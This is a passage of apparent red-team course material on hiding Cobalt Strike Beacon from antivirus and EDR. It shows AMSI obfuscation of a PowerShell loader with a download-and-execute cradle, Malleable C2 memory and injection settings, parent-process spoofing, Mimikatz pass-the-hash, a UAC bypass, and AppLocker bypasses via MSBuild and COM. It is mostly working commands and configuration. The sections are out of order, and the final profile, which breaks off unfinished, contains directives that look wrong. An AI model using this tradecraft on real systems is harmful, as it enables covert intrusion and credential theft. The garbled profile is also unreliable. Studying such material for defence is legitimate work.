$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();

ThreatCheck reports the template clean on its own:

PS C:\Tools\cobaltstrike\custom-resources> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\compress.ps1 -e amsi
[+] No threat found!
[*] Run time: 0.18s

It still gets blocked at runtime, however, when delivered via Scripted Web Delivery:

PS C:\Users\Attacker> IEX ((new-object net.webclient).downloadstring('http://10.0.0.5/a'))
IEX : At line:1 char:1
+ $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAA ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.

PowerShell submits to AMSI in layers during evaluation — the decoded output of [Convert]::FromBase64String is scanned before New-Object IO.MemoryStream runs. ThreatCheck cannot replicate this staged scanning behaviour, so trial-and-error obfuscation is the practical workaround.

Use Daniel Bohannon's Invoke-Obfuscation:

PS C:\Users\Attacker> ipmo C:\Tools\Invoke-Obfuscation\Invoke-Obfuscation.psd1
PS C:\Users\Attacker> Invoke-Obfuscation
Invoke-Obfuscation> SET SCRIPTBLOCK '$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'

Apply any obfuscation desired. The %%DATA%% placeholder must be preserved — CS patches shellcode there. Changing it requires a matching change in the Aggressor script. Token obfuscation gives output like:

SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();

Overwrite the contents of compress.ps1, save, then host and test a new payload.

Summary: Beacon's default loader allocates a single RWX region, which AV memory scanners consistently flag. Setting stage.userwx = false in the Malleable C2 profile changes the allocation to RW, then applies per-section permissions after loading — RX for code, R for read-only data, RW for writable data — matching the layout of a legitimately loaded DLL.

Sleep masking extends this by encrypting Beacon's memory during sleep intervals. On wake, Beacon decrypts, runs its callback, re-encrypts, and returns to sleep. The dormant region holds no scannable Beacon IOCs.

4.3 Beacon Memory

All payload formats (.exe, .dll, .ps1) inject the same Beacon shellcode — a loader plus DLL package. The loader maps the DLL into memory, resolves imports, handles relocations, then calls the entry point.

Many AV products perform memory scans either routinely or in response to suspicious activity (thread creation, process spawns, etc.) and will flag Beacon's in-memory footprint. Defender labels these detections with an sms suffix to indicate a memory scan match.

4.3.1 RWX Memory

By default, the prepended loader allocates Beacon's memory as a single PAGE_EXECUTE_READWRITE (RWX) region. Most native applications do not use RWX memory — exceptions are dynamic runtimes like PowerShell and .NET — so its presence is a strong indicator.

Setting stage.userwx to false in the Malleable C2 profile changes the loader's behaviour: it allocates an RW region, copies Beacon in, then applies per-section permissions (RX for code, R for read-only data, RW for writable data) — matching what a legitimately loaded DLL looks like.

4.3.2 DLL Headers

By default, the prepended loader maps Beacon's PE headers (DOS and NT headers) into memory. These headers are only needed during loading — their presence at runtime is an indicator that a PE is running in that region. Setting stage.copy_pe_header to false prevents the loader from copying them, leaving only the .text and .data sections in memory.

4.3.3 Module Stomping

Most RX memory regions in a process correspond to the .text section of a loaded PE and are backed by a module on disk — System Informer shows the backing module in its "Use" column. Beacon, loaded from memory, has no backing module, which itself stands out as an anomaly.

stage.module_[x86|x64] in Malleable C2 enables module stomping — the loader maps a legitimate PE from disk and overwrites its memory with Beacon, so Beacon appears backed by a real module.

The target module must be large enough to accommodate Beacon — pick something at least 512KB from System32 (e.g. module_x64 "Hydrogen.dll"; maps Beacon over C:\Windows\System32\Hydrogen.dll). Most of the original PE remains, with Beacon mapped across its sections.

4.3.4 Strings

Hardcoded strings in .rdata (and sometimes .text) are common memory-based detection targets. The CS client has no built-in export option for the raw Beacon DLL — use the BEACON_RDLL_GENERATE Aggressor hook, which receives the raw DLL for loader replacement:

# -----------------------------------------------
# $1 = Beacon payload file name
# $2 = Beacon payload (dll binary)
# $3 = Beacon architecture (x86/x64)
# $4 = User defined map of options (restapi only)
# -----------------------------------------------
set BEACON_RDLL_GENERATE
{
    local ( '$path $handle' );
    
    $path   = getFileProper ( "C:\\", "Payloads", "beacon_raw." . $3 . ".dll");
    $handle = openf ( ">" . $path );
    writeb ( $handle, $2);
    closef ( $handle );
    
    return $null;
}

artifact_payload ( "http", "raw", "x64", "thread", "None" );

Save the above as beacon.cna. BEACON_RDLL_GENERATE receives the raw Beacon DLL as $2; calling artifact_payload triggers the hook — the resulting payload itself is discarded, only the hook firing matters.

Loading the script into the CS client writes beacon_raw.x64.dll to the target directory. Dump its strings with WSL:

$ strings -d beacon_raw.x64.dll -n 6 > beacon-string.txt

Most of the string literals are format strings used by Beacon's output, for example:

%s as %s\%s: %d
%02d/%02d/%02d %02d:%02d:%02d
%d	%d	%s
%s	%s	%s
?%s=%s
%s&%s=%s
%s%s: %s
%s	%d	%d
%s	%d	%d	%s	%s	%d
%c%c%c%c
%s (admin)
%i	%s	%i

Line 2 formats date and time output for the ls command; line 11 formats the getuid output when run in high integrity.

Strings can be replaced via the stage.transform-x64 and stage.transform-x86 blocks (x86 is identical to the x64 example below). strrep replaces one string with another; raw bytes use the \x syntax:

stage {
    set userwx "false";
    set cleanup "true";
    set copy_pe_header "false";
    set module_x64 "Hydrogen.dll";
    
    transform-x64 {
        strrep "beacon.x64.dll" "bacon.x64.dll";
        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
        strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
    }
}

Two caveats apply when replacing strings:

  • The replacement must be the same length as the original — shorter strings break offsets in the DLL
  • HTTP standard strings tied to Beacon's internal web server (e.g. HTTP/1.1 200 OK, Content-Type, Content-Length) must not be replaced. The internal server is used by powershell-import to host imported scripts so powershell, powerpick, and psinject can fetch them; replacing those strings breaks the entire workflow.
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: %d

Why this matters: Fork-and-run commands spawn a sacrificial rundll32.exe, inject the post-ex tool, read results, and terminate the process. The resulting parent-child chain (beacon.exe → rundll32.exe → [tool]) is a high-fidelity EDR detection.

Cobalt Strike exposes two controls: spawnto (which process hosts the post-ex DLL) and ppid spoofing (which process appears as the parent). Set spawnto to a binary that legitimately exists on the host (e.g. svchost.exe), then spoof the parent to something plausible like explorer.exe — the resulting tree resembles a scheduled task or system service rather than a Beacon spawn.

Fork & Run vs. Inline: Fork-and-run is the default — spawn, inject, collect output. Inline execution runs everything inside the Beacon process: zero child-process noise, but a tool crash kills the Beacon. Built-in commands (ls, ps, screenshot) run inline by design; for execute-assembly and BOFs, the operator chooses.

4.4 Beacon Command Behaviour

Beacon's commands fall into different implementation classes, each with distinct OPSEC profiles. Understanding how each class works under the hood is essential for making safe choices during an engagement.

4.4.1 House-keeping commands

House-keeping commands set runtime configuration or perform housekeeping tasks. Some (checkin, sleep, cancel, powershell-import, spawnto, ppid) task Beacon to carry out the change; the rest (help, clear, downloads, jobs, note) are handled client-side.

4.4.2 API-only commands

API-only commands are built into Beacon and call native Windows APIs directly. Common ones include cd, cp, ls, mv, ps, pwd, rm, and upload.

4.4.3 Inline commands

Inline commands run as BOFs — compiled C programs executing inside the Beacon session. The BOF and its arguments arrive in the tasking data; on completion, the BOF is cleared from memory. Commands implemented as BOFs include dllload, getsystem, and timestomp.

BOFs are also the most common way to extend Beacon with custom commands — TrustedSec's Situational Awareness BOF is a good reference implementation.

OPSEC considerations

The way BOFs are loaded into (and cleared from) memory is controlled with the process-inject block in a Malleable C2 profile.

process-inject {
    # This sets the API used to allocate BOF memory. Options are VirtualAlloc, MapViewOfFile, and HeapAlloc.
    set bof_allocator "VirtualAlloc";
    
    # This controls what happens to the memory allocation after a BOF has run.
    # If true, allocation is kept but zero'd out. If false, allocation is freed (depending on bof_allocator).
    # If memory is not large enough for the next BOF, it's freed and re-allocated regardless.
    set bof_reuse_memory "true";
    
    # This controls the size of the initial memory allocation. Make sure this is large
    # enough to accommodate the BOFs you typically run if you want to avoid too many memory
    # freeing and allocation events.
    set min_alloc "8192";
    
    # This controls the initial/resting permission of the memory allocation.
    # If true, RWX is used. If false, RW is used.
    # If bof_reuse_memory is true, memory is restored to this permission when a BOF has run.
    set startrwx "false";
    
    # This controls the final permission of the memory allocation prior to calling a BOFs entry point.
    # If true, it's flipped to RWX.
    # If false, it's flipped to RX for the BOFs code section and RW for the data section.
    set userwx "false";
}

BOFs are executed by Beacon's main thread - so there are no OPSEC considerations for new thread creations.

4.4.4 Fork & run commands

Beacon post-ex features are DLLs appended to a loader as shellcode, then injected into a target process. Output is read back over an SMB named pipe. Sub-categories: spawn (new temp process) and explicit (existing target process).

Some fork & run commands support both variants, while some only support one or the other.

OPSEC considerations

These commands carry the heaviest OPSEC burden because they must inject shellcode, start a new thread, and start a new named pipe. The spawn variant must also start a new sacrificial process. As with BOFs, Malleable C2's process-inject block can influence how the shellcode is injected.

process-inject {
    # This sets the API used to allocate memory in the target process.
    # Options are VirtualAllocEx and NtMapViewOfSection.
    # Be aware that NtMapViewOfSection can only be used for same-arch injection.
    # VirtualAllocEx will always be used for cross-arch injection.
    set allocator "VirtualAllocEx";
    
    # These options behave in a similar way as they do for BOFs.
    set startrwx "false";
    set userwx "false";
    
    # This sub-block sets the APIs used to create the new thread. Multiple options are provided here
    # to cover various cases, mostly cross-arch injection. The following is a breakdown of each
    # option and technique:
    #
    # CreateThread        : for the current process only.
    # CreateRemoteThread  : supports x64 -> x86 injection.
    # NtQueueApcThread    : same arch injection only.
    # NtQueueApcThread-s  : this is the "early bird" injection pattern (also same arch only).
    # ObfSetThreadContext : same arch injection only.
    # RtlCreateUserThread : supports x86 -> x64 injection but must use RWX memory.
    # SetThreadContext    : also supports x64 -> x86 injection.
    # Beacon evaluates techniques top-to-bottom, so put your prefered techniques at the top
    # and 'backup' techniques as you go down. If an edge case is not covered, injection will fail.
    #
    # CreateThread, CreateRemoteThread, and ObfSetThreadContext can spoof the address of another
    # function using the "module!function+0x##" syntax. These threads are created in a suspended state
    # and are updated to point at the shellcode before they're resumed.
    # This can help avoid those memory scan triggers.
    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
        NtQueueApcThread-s;
        NtQueueApcThread;
        SetThreadContext;
    }
}

The post-ex block can be used to control other elements of fork & run, as well as modify the post-ex DLLs themselves.

post-ex {
    # These control default process paths used by the 'spawn' variant for x64 & x86 post-ex DLLs.
    # Environment variables are ok, but always use 'sysnative' and 'syswow64' instead of 'system32'.
    # Override these at runtime using the spawnto command.
    set spawnto_x64 "%windir%\\sysnative\\msiexec.exe";
    set spawnto_x86 "%windir%\\syswow64\\msiexec.exe";
    
    # This option tells the post-ex DLL to free the post-ex loader from memory.
    set cleanup "true";
    
    # This option changes the name of the post-ex named pipe from "postex_####".
    # A comma-separated list allows Cobalt Strike to pick a random one each time.
    # Each '#' will also be replaced with a random hex character.
    set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
    
    # Some post-ex DLLs (like the portscanner) create multiple threads to help it run faster.
    # This option tells the DLL to spawn new threads with the specificed spoofed start address.
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
    
    # This disables AMSI in powerpick, execute-assembly, and psinject, using a memory patching technique.
    set amsi_disable "true";
    
    # This sub-block can be used to replace strings in the post-ex DLL.
    # Use transform-x86 for x86 DLLs.
    transform-x64 {
        # strrep will replace a string in any post-ex DLL. This is good for generic strings.
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
        
        # strrepex will replace a string in a specific post-ex DLL. This is good for strings
        # that only appear in specific DLLs.
        #
        # The valid post-ex names are: BrowserPivot, ExecuteAssembly, Hashdump, Keylogger, Mimikatz,
        # NetView, PortScanner, PowerPick, Screenshot, and SSHAgent.
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
        strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
    }
}

4.4.5 Process execution commands

Process execution commands run an arbitrary program on disk. Common ones include shell, run, execute, and jump.

4.4.6 Service creations

The following Beacon commands create a service — locally or remotely — to run a command or Beacon: psexec, psexec_psh, elevate svc-exe, and jump psexec*.

OPSEC considerations

PsExec's service binary always uses rundll32 as its default spawnto. post-ex.spawnto in Malleable C2 doesn't apply (env vars invalid in SYSTEM context). Override with an explicit path via the Artifact Kit's ak-settings command.

4.5 Blending post-ex

Egress Beacons should run inside processes that legitimately use the same C2 protocol — e.g. an HTTP/S Beacon inside a browser process. Spawned child processes default to having Beacon as their parent, which is itself an IOC. Two mechanisms blend the spawn:

  • ppid — spoof the parent process when spawning. Get the target PID from ps or the Process Browser, then spawn under it (e.g. explorer.exe to blend with normal user activity).
  • spawnto — control which process hosts fork-and-run post-ex (execute-assembly, powerpick). Combine with ppid — e.g. PPID explorer.exe + spawnto notepad.exe.
beacon> ppid 6696
[*] Tasked beacon to spoof 6696 as parent process

beacon> shell timeout 60
[*] Tasked beacon to run: timeout 60

The same applies to the run command. For an HTTPS Beacon, spawnto can also point to a browser to blend C2 traffic:

beacon> ppid
[*] Tasked beacon to use itself as parent process

beacon> spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --profile-directory=Default
[*] Tasked beacon to spawn x64 features to: "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --profile-directory=Default

beacon> powerpick start-sleep -s 60

Profile settings alone are not sufficient — every command must blend with where the current Beacon is running and what the command does.

4.6 Command-Line Detections

Most Beacon commands that spawn a process call CreateProcessA:

BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);

The API takes two string parameters — lpApplicationName (the binary to run) and lpCommandLine (its full command line). Some Beacon commands invoke third-party tools that spawn processes in non-obvious ways. The two examples below illustrate how EDR can catch those spawns even when the Beacon itself looks clean.

4.6.1 pth

pth wraps Mimikatz's sekurlsa::pth to impersonate a user via their NTLM hash. Even a SYSTEM Beacon gets access denied before the token is applied — example output below.

beacon> getuid
[*] Tasked beacon to get userid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> pth CONTOSO\rsteel FC525C9683E8FE067095BA2DDC971889
[*] Tasked beacon to run mimikatz's sekurlsa::pth /user:"rsteel" /domain:"CONTOSO" /ntlm:FC525C9683E8FE067095BA2DDC971889 /run:"%COMSPEC% /c echo 3653adf6614 > \\.\pipe\c0b81c" command
[+] [job 0] received output:
user	: rsteel
domain	: CONTOSO
program	: C:\Windows\system32\cmd.exe /c echo 3653adf6614 > \\.\pipe\c0b81c
impers.	: no
NTLM	: fc525c9683e8fe067095ba2ddc971889
ERROR kuhl_m_sekurlsa_pth ; CreateProcessWithLogonW (0x00000005)

beacon> windows_error_code 5
ERROR_ACCESS_DENIED

The output reveals that Mimikatz tried to run cmd.exe /c echo 3653adf6614 > \\.\pipe\c0b81c via CreateProcessWithLogonW — a known named-pipe impersonation pattern. The access denied error is the EDR driver blocking that API call.

4.6.2 uac-schtasks

uac-schtasks is a UAC bypass from Cobalt Strike's Elevate Kit, used to elevate from medium to high integrity.

beacon> elevate uac-schtasks tcp-local
[*] Tasked Beacon to run windows/beacon_bind_tcp (127.0.0.1:1337) in a high integrity context
[+] [job 0] received output:
ERROR: Start-Process : This command cannot be run due to the error: Access is denied.
ERROR: At line:77 char:21
ERROR: + ...  $Process = Start-Process -FilePath $schtasksPath -ArgumentList '/Run ...
ERROR: +                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException
ERROR:     + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcess 
ERROR:    Command
ERROR:

The kit's Aggressor script registers the exploit via beacon_exploit_register. The schtasks_exploit function imports Invoke-EnvBypass.ps1 and executes it via Invoke-EnvBypass. The script in turn calls Start-Process against schtasks.exe with /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I — and EDR catches the spawn.

4.6.3 Why "access denied"?

The Defender driver hooks process creation via kernel callbacks like PsSetCreateProcessNotifyRoutineEx. The callback receives a PPS_CREATE_NOTIFY_INFO containing the new process's ImageFileName and CommandLine; if either matches a known abuse pattern, the driver sets CreationStatus to STATUS_ACCESS_DENIED — surfacing as the access-denied errors above.

4.6.4 Bypasses?

Disabling kernel callbacks requires kernel-level code execution (driver or kernel exploit) — out of scope here. The practical alternative is to find an alternate procedure for the same objective, e.g. a COM object or API call instead of schtasks.exe.

4.7 AppLocker

AppLocker controls which applications, scripts, and packages users can run. Policies are typically deployed by administrators via GPO or Intune. Each rule has a permission (allow or deny, plus the target user/group) and a condition (path, publisher, or hash). Windows ships a default rule collection covering four file categories:

  • Executable rules — .exe and .com
  • Windows Installer rules — .msi, .msp, .mst
  • Script rules — .ps1, .bat, .cmd, .vbs, .js
  • Packaged app rules — .appx

Default rules can be deployed as-is or tweaked per business requirements. Attempting to run a non-permitted application returns an access-denied error.

4.8 Policy Enumeration

AppLocker policies can be enumerated from two locations: directly from the GPO, or from the local registry of a computer to which they're applied. Enumerating the policy is practically essential for finding a potential bypass.

4.8.1 Registry

AppLocker policies on a local machine are stored at HKLM\Software\Policies\Microsoft\Windows\SrpV2 — each rule type in its own subkey as XML strings.

PS C:\Users\pchilds> Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2'

    Hive: HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2

Name                           Property
----                           --------
Appx                           EnforcementMode : 1
                               AllowWindows    : 0
Dll                            AllowWindows : 0
Exe                            EnforcementMode : 1
                               AllowWindows    : 0
Msi                            EnforcementMode : 1
                               AllowWindows    : 0
Script                         EnforcementMode : 1
                               AllowWindows    : 0

PS C:\Users\pchilds> Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe'

    Hive: HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe

Name                           Property
----                           --------
921cc481-6e17-4653-8f75-050b80 Value : <FilePathRule Id="921cc481-6e17-4653-8f75-050b80acca20" Name="(Default Rule)
acca20                         All files located in the Program
                                       Files folder" Description="Allows members of the Everyone group to run
                               applications that are located in the
                                       Program Files folder." UserOrGroupSid="S-1-1-0"
                               Action="Allow"><Conditions><FilePathCondition
                                       Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>
a61c8b2c-a319-4cd0-9690-d2177c Value : <FilePathRule Id="a61c8b2c-a319-4cd0-9690-d2177cad7b51" Name="(Default Rule)
ad7b51                         All files located in the Windows
                                       folder" Description="Allows members of the Everyone group to run applications
                               that are located in the Windows
                                       folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition
                                       Path="%WINDIR%\*"/></Conditions></FilePathRule>

The native Get-AppLockerPolicy cmdlet parses the rules into a more readable form:

PS C:\Users\pchilds> $policy = Get-AppLockerPolicy -Effective
PS C:\Users\pchilds> $policy.RuleCollections

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 921cc481-6e17-4653-8f75-050b80acca20
Name                : (Default Rule) All files located in the Program Files folder
Description         : Allows members of the Everyone group to run applications that are located in the Program Files
                      folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

4.8.2 GPO

Enumerate AppLocker policies from GPO before moving to a protected machine. Find the target GPO by name, or walk \\contoso.com\SYSVOL\contoso.com\Policies looking for Registry.pol in each policy's Machine directory.

beacon> ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSysPath

--------------------
displayName: AppLocker
gPCFileSysPath: \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}
--------------------

beacon> ls \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}\Machine

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     03/29/2025 10:47:29   Microsoft
          dir     03/29/2025 10:47:27   Scripts
 8kb      fil     03/29/2025 10:48:02   Registry.pol

beacon> download \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}\Machine\Registry.pol
[*] started download of \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}\Machine\Registry.pol (8216 bytes)
[*] download of Registry.pol is complete

Once sync'd to your desktop, the file can be read using the Parse-PolFile cmdlet from the GpRegistryPolicy module.

PS C:\Users\Attacker> Parse-PolFile -Path .\Desktop\Registry.pol

KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Exe\921cc481-6e17-4653-8f75-050b80acca20
ValueName   : Value
ValueType   : REG_SZ
ValueLength : 736
ValueData   : <FilePathRule Id="921cc481-6e17-4653-8f75-050b80acca20" Name="(Default Rule) All files located in the
              Program Files folder" Description="Allows members of the Everyone group to run applications that are
              located in the Program Files folder." UserOrGroupSid="S-1-1-0"
              Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>

4.9 Policy Bypasses

Bypasses depend on the deployed policy. Common targets covered below:

  • Path wildcards — custom rules with overly permissive wildcards
  • Writeable directories — user-writable subdirectories inside default allow paths
  • LOLBAS — Microsoft-signed binaries that execute arbitrary code
  • PowerShell CLM — Constrained Language Mode bypasses via COM
  • rundll32 — loads arbitrary DLLs when DLL rules aren't enforced

4.9.1 Path wildcards

Custom rules sometimes allow execution from a directory but use an overly permissive wildcard:

<FilePathRule Id="daecf627-c762-4c7d-849a-7eb9d4e9692e" Name="App-V" Description="" UserOrGroupSid="S-1-1-0" Action="Allow">
	<Conditions>
		<FilePathCondition Path="*\App-V\*"/>
	</Conditions>
</FilePathRule>

The path is not anchored to %PROGRAMFILES% or %WINDIR% — any directory named App-V anywhere on the filesystem matches the rule.

4.9.2 Writeable directories

The default %WINDIR%\* allow rule covers several subdirectories that standard users can write to. Dropping an executable, script, or installer into one of these locations bypasses the policy. Find writable paths with Get-Acl or icacls — common candidates include C:\Windows\Tasks, C:\Windows\Temp, C:\Windows\Tracing, and C:\Windows\System32\spool\drivers\color.

4.9.3 LOLBAS

LOLBAS binaries that execute arbitrary code can bypass AppLocker because they live in whitelisted locations such as %WINDIR%\*. MSBuild, for example, executes arbitrary C# from a crafted .csproj:

<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuild/>
  </Target>
   <UsingTask
    TaskName="MSBuild"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Reference Include="System.Windows.Forms" />		
      <Code Type="Class" Language="cs">
        <![CDATA[
		using Microsoft.Build.Utilities;
		using System.Windows.Forms;

		public class MSBuild : Task
		{
			public override bool Execute()
			{
				MessageBox.Show("Hello World", "AppLocker Bypass");
				return true;
			}
		}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>

4.9.4 PowerShell CLM

AppLocker also forces PowerShell into ConstrainedLanguage mode, which blocks language features that can invoke arbitrary Windows and .NET APIs:

PS C:\Users\pchilds> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

PS C:\Users\pchilds> [System.Console]::WriteLine("Hello World")
Cannot invoke method. Method invocation is supported only on core types in this language mode.

The restrictions are not watertight. New-Object can still load COM objects such as WScript.Shell:

PS C:\Users\pchilds> New-Object -ComObject WScript.Shell

SpecialFolders     CurrentDirectory
--------------     ----------------
System.__ComObject C:\Users\pchilds

Register a custom COM object backed by an arbitrary DLL and CLM will load it into the PowerShell process — the same registry pattern used for COM hijacking:

PS C:\Users\pchilds> [System.Guid]::NewGuid()

Guid
----
6136e053-47cb-4fdd-84b1-381bc5f3edb3

C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\CLSID' -Name '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}' -Name 'InprocServer32' -Value 'C:\Users\pchilds\Desktop\bypass.dll'
C:\Users\pchilds> New-ItemProperty -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}\InprocServer32' -Name 'ThreadingModel' -Value 'Both'

C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes' -Name 'AppLocker.Bypass' -Value 'AppLocker Bypass'
C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\AppLocker.Bypass' -Name 'CLSID' -Value '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'

The source code for this DLL is simply:

#include <windows.h>
#include <stdio.h>

extern "C" __declspec(dllexport) BOOL execute() {
	MessageBox(NULL, L"Hello World", L"AppLocker Bypass", 0);
	return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		return execute();
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}

4.9.5 rundll32

AppLocker can enforce DLL rules, but they're rarely enabled in practice due to the performance cost. When disabled, rundll32 loads arbitrary DLLs — the only requirement is that the DLL exports at least one function to call.

4.10 Malleable C2 Profile

A Malleable C2 profile controls all on-wire and in-memory behaviour of the team server and Beacon. The template below incorporates sleep masking, module stomping, RWX avoidance, and HTTP traffic mimicking Microsoft Update.

4.10.1 Global Settings

set sleeptime "45000";          # 45-second base sleep
set jitter     "33";            # ±33% variance — breaks timing analysis
set maxdns     "255";
set useragent  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0";
set host_stage "false";         # Stage payloads via a separate listener, not this profile

4.10.2 Stage Block — Memory Layout

Controls how Beacon is loaded and stored in memory. Every option here maps directly to a detection primitive used by AV and EDR.

stage {
    set userwx       "false";              # Never allocate RWX — alloc RW, flip to RX before exec
    set sleep_mask   "true";               # XOR-encrypt Beacon in memory during sleep intervals
    set stomppe      "true";               # Zero the MZ/PE header after loading — defeats memory scanners
    set obfuscate    "true";               # Obfuscate Beacon's import table
    set cleanup      "true";               # Free loader memory after Beacon executes
    set smartinject  "true";               # Borrow PE header from a legitimate loaded DLL
    set allocator    "NtMapViewOfSection"; # Map a section object instead of calling VirtualAlloc

    # Module stomping — overwrite a rarely-used, non-critical DLL's memory region
    # xpsservices.dll is loaded but largely inactive on most Windows 10/11 systems
    set module_x64   "xpsservices.dll";
    set module_x86   "xpsservices.dll";

    # Replace Beacon strings visible in heap/memory dumps
    stringReplace "ReflectiveLoader"  "MicrosoftUpdate";
    stringReplace "beacon.dll"        "cryptbase.dll";
    stringReplace "BeaconJitter"      "TimerResolution";

    transform-x64 {
        prepend "\x90\x90\x90\x90";        # NOP sled before Beacon — pads the mapped region
    }
    transform-x86 {
        prepend "\x90\x90\x90\x90";
    }
}

4.10.3 Process Injection Block

Controls how Beacon injects into remote processes. The execute block defines the injection primitive priority order.

process-inject {
    set startrwx         "false";  # Allocate RW, flip to RX — same principle as stage block
    set userwx           "false";
    set bof_reuse_memory "true";   # Reuse BOF memory allocations — reduces allocation noise
    min_alloc            "16384";  # Minimum 16 KB allocation — avoids tiny suspicious allocs

    transform-x64 {
        prepend "\x90\x90";
    }
    transform-x86 {
        prepend "\x90\x90";
    }

    execute {
        # Priority order — CS tries each in sequence until one succeeds
